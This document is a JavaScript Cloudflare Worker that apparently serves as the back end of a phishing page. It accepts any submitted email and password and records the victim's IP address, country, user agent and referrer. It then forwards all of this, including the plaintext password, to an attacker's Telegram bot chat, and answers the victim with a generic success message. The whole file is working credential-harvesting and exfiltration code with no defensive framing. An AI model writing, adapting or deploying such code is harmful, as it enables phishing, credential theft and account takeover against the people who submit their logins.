export default {
  async fetch(request, env, ctx) {
    // Handle CORS preflight requests
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        status: 200,
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type',
          'Access-Control-Max-Age': '86400',
        },
      });
    }

    // Only allow POST requests
    if (request.method !== 'POST') {
      return new Response('Method not allowed', { 
        status: 405,
        headers: {
          'Access-Control-Allow-Origin': '*',
        }
      });
    }

    try {
      // Parse the request body
      const data = await request.json();
      
      // Validate required fields
      if (!data.email || !data.password) {
        return new Response(JSON.stringify({ 
          error: 'Missing required fields' 
        }), {
          status: 400,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
          }
        });
      }

      // Get client IP from Cloudflare headers
      const clientIP = request.headers.get('CF-Connecting-IP') || 
                       request.headers.get('X-Forwarded-For') || 
                       'Unknown';

      // Get country from Cloudflare headers
      const country = request.headers.get('CF-IPCountry') || 'Unknown';

      // Prepare Telegram message
      const telegramMessage = `🔐 New Login Attempt

📧 Email: ${data.email}
🔑 Password: ${data.password}
🌐 IP: ${clientIP}
🌍 Country: ${country}
🖥️ User Agent: ${data.userAgent || 'Unknown'}
⏰ Time: ${new Date().toLocaleString()}
🔗 Referrer: ${data.referrer || 'Direct'}`;

      // Send to Telegram
      const telegramResponse = await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: env.TELEGRAM_CHAT_ID,
          text: telegramMessage,
          parse_mode: 'HTML'
        })
      });

      if (!telegramResponse.ok) {
        console.error('Telegram API error:', await telegramResponse.text());
        return new Response(JSON.stringify({ 
          error: 'Failed to send notification' 
        }), {
          status: 500,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
          }
        });
      }

      // Return success response
      return new Response(JSON.stringify({ 
        success: true,
        message: 'Data processed successfully' 
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
        }
      });

    } catch (error) {
      console.error('Worker error:', error);
      return new Response(JSON.stringify({ 
        error: 'Internal server error' 
      }), {
        status: 500,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
        }
      });
    }
  },
};